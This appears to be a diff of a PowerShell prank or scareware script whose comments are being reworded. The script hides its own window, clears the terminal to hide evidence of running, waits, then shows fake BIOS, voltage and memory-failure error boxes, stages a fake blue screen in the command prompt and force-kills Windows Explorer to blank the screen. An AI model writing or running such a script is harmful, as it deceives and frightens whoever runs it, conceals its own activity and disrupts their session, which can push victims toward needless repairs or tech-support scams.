@@ -1,10 +1,13 @@
-# Clear terminal history (hides evidence of execution)
+# Clear PowerShell window immediately (hide execution)
 Clear-Host
 
-# Instantly hide the PowerShell window
+# Hide PowerShell & Command Prompt windows
 $psWindow = (Get-Process -Id $PID).MainWindowHandle
 
-# Check if the WinAPI type is already defined
+# Create a hidden command prompt that forces PowerShell to minimize
+Start-Process -WindowStyle Hidden cmd.exe -ArgumentList "/c start /min powershell -NoExit -Command `exit`"
+
+# Check if WinAPI type is already defined (prevents duplicate errors)
 if (-not ([System.Management.Automation.PSTypeName]'WinAPI').Type) {
     Add-Type @"
     using System;
@@ -18,13 +21,13 @@ if (-not ([System.Management.Automation.PSTypeName]'WinAPI').Type) {
 "@
 }
 
-# Hide PowerShell Immediately (No "1s" output)
+# Hide PowerShell
 [void][WinAPI]::ShowWindow($psWindow, 0)
 
-# Fake delay to build suspense
+# Wait 15 seconds before doing anything (Suspense)
 Start-Sleep -Seconds 15
 
-# Function to show realistic error messages
+# Function to show fake error messages
 function Show-Error {
     param (
         [string]$message,
@@ -33,7 +36,7 @@ function Show-Error {
     [void][WinAPI]::MessageBox([IntPtr]::Zero, $message, $title, 0x10)
 }
 
-# List of realistic errors (Motherboard & Memory failure)
+# List of random realistic system failure messages
 $errors = @(
     "System Overload: Voltage Surge Detected on PCI Bus.",
     "BIOS Integrity Failure: Checksum Mismatch Detected!",
@@ -49,28 +52,28 @@ $errors = @(
     "Thermal Protection Override: Temperature Sensors Disabled!"
 )
 
-# Display errors at unpredictable intervals
+# Show error messages at random intervals
 for ($i = 0; $i -lt 6; $i++) {
     Show-Error ($errors | Get-Random) "SYSTEM CRITICAL ERROR"
-    Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 12)  # Random wait time
+    Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 12)
 }
 
-# Fake BSOD Sequence (Reveal PowerShell again)
+# Fake BSOD Sequence - Reveal PowerShell for dramatic effect
 [void][WinAPI]::ShowWindow($psWindow, 5)
 
-# Fake Blue Screen simulation
+# Fake Blue Screen using Command Prompt
 Start-Process "cmd.exe" -ArgumentList "/c color 1F && mode con cols=80 lines=25 && echo A critical system error has occurred... && timeout 10" -NoNewWindow -Wait
 
-# Simulated hardware failure (flashing error messages)
+# Fake Memory Crash Effect (Flashing Terminal)
 for ($i=0; $i -lt 4; $i++) {
     Start-Process "cmd.exe" -ArgumentList "/c color 4F && echo Memory corruption spreading! && timeout 1" -NoNewWindow -Wait
     Start-Process "cmd.exe" -ArgumentList "/c color 1F && echo CRITICAL FAILURE! Kernel Error!" -NoNewWindow -Wait
 }
 
-# Final catastrophic error
+# Final catastrophic error message
 Show-Error "OS integrity compromised! Immediate shutdown required to prevent hardware damage!" "FATAL SYSTEM ERROR"
 
-# Make Windows Explorer disappear (blank screen)
+# Make Windows Explorer disappear (blank screen effect)
 Stop-Process -Name explorer -Force
 Start-Sleep -Seconds 5
 
